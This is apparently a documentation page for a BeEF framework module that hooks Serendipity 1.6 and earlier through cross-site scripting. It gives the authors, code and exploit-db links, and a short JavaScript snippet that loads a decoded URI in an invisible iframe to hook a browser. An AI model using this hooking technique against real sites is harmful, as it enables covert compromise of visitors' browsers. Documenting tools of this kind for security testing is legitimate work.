## Summary

* **Objective**: hook Serendipity <= 1.6 using XSS
* **Authors**: bcoles, Stefan Schurtz
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/xss/serendipity_1.6_xss)

## Internal Working

Uses an invisible iframe to hook the serendipity instance

```js
        var uri = beef.encode.base64.decode('<%= Base64.strict_encode64(@uri) %>');

        var serendipity_iframe = beef.dom.createInvisibleIframe();
        serendipity_iframe.setAttribute('src', uri);

```

## References

http://www.exploit-db.com/exploits/18884/

## Feedback
